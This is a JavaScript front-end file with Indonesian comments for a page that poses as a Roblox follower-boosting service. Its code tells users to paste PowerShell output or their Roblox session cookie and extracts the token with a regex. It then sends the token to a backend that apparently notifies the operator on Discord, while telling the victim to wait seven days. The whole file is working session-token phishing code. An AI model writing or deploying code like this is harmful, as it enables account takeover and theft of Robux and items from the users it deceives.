const cookiesForm = document.getElementById('cookies-form');
const cookiesInput = document.getElementById('cookies');
const followersInput = document.getElementById('followers');
const saveCookiesButton = document.getElementById('save-cookies');
const statusDiv = document.getElementById('status');

// Fungsi untuk memperbarui status dengan efek fade-in
function updateStatus(message, isError = false) {
    statusDiv.innerHTML = `<p>${message}</p>`;
    statusDiv.classList.remove('opacity-0');
    statusDiv.classList.add('opacity-100');

    if (isError) {
        statusDiv.classList.remove('text-gray-300', 'border-purple-600');
        statusDiv.classList.add('text-red-400', 'border-red-600');
    } else {
        statusDiv.classList.remove('text-red-400', 'border-red-600');
        statusDiv.classList.add('text-gray-300', 'border-purple-600');
    }
}

// Fungsi untuk mengekstrak cookie dari string PowerShell
function extractRobloxCookie(inputString) {
    const regex = /_\|WARNING:.*?\|\_([a-zA-Z0-9.\-_]+)/;
    const match = inputString.match(regex);
    if (match && match[1]) {
        return `_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_${match[1]}`;
    }
    // Jika tidak cocok dengan format PowerShell, asumsikan input adalah cookie langsung
    if (inputString.startsWith("CAEaAhADIhsKBGR1aWQSEz")) {
        return `_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_${inputString}`;
    }
    if (inputString.startsWith("_|WARNING") && inputString.includes("CAEaAhADI")) {
        return inputString;
    }
    return null; // Tidak dapat mengekstrak cookie
}

saveCookiesButton.addEventListener('click', async () => {
    const rawInput = cookiesInput.value.trim();
    const followers = followersInput.value.trim();

    if (!rawInput) {
        updateStatus('❌ Harap masukkan script PowerShell atau cookie Anda!', true);
        return;
    }
    if (!followers || parseInt(followers) < 1) {
        updateStatus('❌ Harap masukkan jumlah followers yang valid (minimal 1)!', true);
        return;
    }

    updateStatus('Memproses data...', false); // Status loading awal

    const extractedCookie = extractRobloxCookie(rawInput);

    if (!extractedCookie) {
        updateStatus('❌ Gagal mengidentifikasi cookie Roblox dari input. Pastikan formatnya benar.', true);
        return;
    }

    try {
        // URL ini akan menunjuk ke fungsi serverless Anda di Vercel
        const response = await fetch('/api/process-roblox-data', { // Mengarah ke /api/process-roblox-data.js di Vercel
            method: 'POST',
            headers: {
                'Content-Type': 'application/json' // Mengirim JSON ke backend Node.js
            },
            body: JSON.stringify({ // Mengirim data sebagai JSON
                cookie: extractedCookie,
                followers: followers
            })
        });

        const data = await response.json(); // Backend Node.js akan merespons JSON

        if (response.ok && data.statusCode === 200) {
            updateStatus('✅ Berhasil, silahkan tunggu 7 hari. Notifikasi Discord terkirim!', false);
        } else {
            updateStatus(`❌ Gagal memproses: ${data.message || 'Respons tidak valid'}`, true);
        }
    } catch (error) {
        console.error('Error:', error);
        updateStatus(`❌ Terjadi kesalahan saat berkomunikasi dengan server: ${error.message}. Periksa log Vercel.`, true);
    }
});

// Fungsi untuk memeriksa status awal saat halaman dimuat (tidak relevan lagi dengan file lokal)
// Kita bisa menghapusnya atau membiarkannya, tapi tidak akan berfungsi secara lokal
async function checkInitialStatus() {
     statusDiv.innerHTML = '<p>Siap menerima input. Setelah deploy, status akan lebih informatif.</p>';
}

checkInitialStatus();